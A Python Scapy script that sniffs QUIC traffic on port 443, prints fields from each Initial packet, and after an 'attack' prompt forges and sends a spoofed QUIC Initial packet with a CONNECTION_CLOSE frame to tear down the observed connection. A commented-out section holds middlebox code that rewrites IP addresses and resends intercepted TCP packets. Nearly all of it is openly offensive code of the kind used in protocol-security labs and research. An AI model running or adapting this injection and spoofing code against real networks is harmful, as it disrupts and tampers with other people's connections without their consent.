import os

from scapy.all import *
load_contrib("quic")

from scapy.layers.quic import *
from connection_close import QUIC_CONNECTION_CLOSE
bind_bottom_up(UDP, QUIC, dport=443)
bind_bottom_up(UDP, QUIC, sport=443)
bind_layers(UDP, QUIC, dport=443, sport=443)
def handle_quic(pkt):
    # Only process if this packet has a QUIC Initial header
    if pkt.haslayer(UDP):
        if QUIC_Initial in pkt or pkt.haslayer(QUIC_Initial):
            qi = pkt[QUIC_Initial]
            print("QUIC Initial packet detected")
            print(f"  - Version       : 0x{qi.Version:08X}")
            print(f"  - DestConnID    : {qi.DstConnID.hex()}")
            print(f"  - SrcConnID     : {qi.SrcConnID.hex()}")
            print(f"  - TokenLength   : {qi.TokenLen}")
            print(f"  - PacketNumber  : {qi.PacketNumber}")
            print(f"  - PayloadLength : {qi.Length}")
            # Raw (still encrypted) payload bytes
            raw = bytes(qi.payload)
            #print(f"  - Encrypted payload (first 32B): {raw[:32].hex()}…")
            if input("Enter 'yes' to attack!: ") == "yes":
                """if pkt.sniffed_on == 'middlebox-eth0':
                    print(Fore.GREEN + pkt.summary())
                    ports[pkt[TCP].sport] = pkt[IP].src
                    print(f"{Fore.GREEN} {ports}")
                    new_pkt = pkt[IP]
                    new_pkt[IP].src = "10.69.0.100"
                    del new_pkt.getlayer(IP).chksum
                    del new_pkt.getlayer(TCP).chksum
                    print(f"New PKT: {new_pkt.summary()}")
                    send(new_pkt)
                elif pkt.sniffed_on == 'middlebox-eth1':
                        if pkt[TCP].dport in ports:
                            print(Fore.RED + pkt.summary())
                            new_pkt = pkt[IP]
                            new_pkt[IP].dst = ports[pkt[TCP].dport]
                            del new_pkt.getlayer(IP).chksum
                            del new_pkt.getlayer(TCP).chksum
                            print(f"New PKT: {new_pkt.summary()}")
                            send(new_pkt)"""
                initial =  QUIC_Initial(
                    Version      = 0x00000001,
                    DstConnIDLen = len(qi.SrcConnID), DstConnID=qi.SrcConnID,
                    SrcConnIDLen = len(qi.DstConnID), SrcConnID=qi.DstConnID,
                    TokenLen     = 0,
                    Token        = b'',
                    PacketNumber = 1,
                    # length = size of everything after the PacketNumber field
                    # here: one CC frame only
                    Length       = len(QUIC_CONNECTION_CLOSE())
                )

                # build a CONNECTION_CLOSE frame
                cc = QUIC_CONNECTION_CLOSE(
                    type          = 0x1C,
                    error_code    = 0x10,         # arbitrary error
                    frame_type    = 0,            # e.g. PADDING triggered it
                    reason_phrase = b"oops!"
                )

                pkt = (
                    IP(dst=pkt[IP].src)/
                    UDP(sport=12345, dport=443)/
                    initial/
                    cc
                )

                send(pkt)
        

# Sniff UDP 443 traffic and invoke handle_quic for each packet
sniff(
    #iface="Ethernet 2",
    #filter="udp port 443",
    prn=handle_quic,         # callback for every packet
    store=False                  # don’t keep packets in memory
)
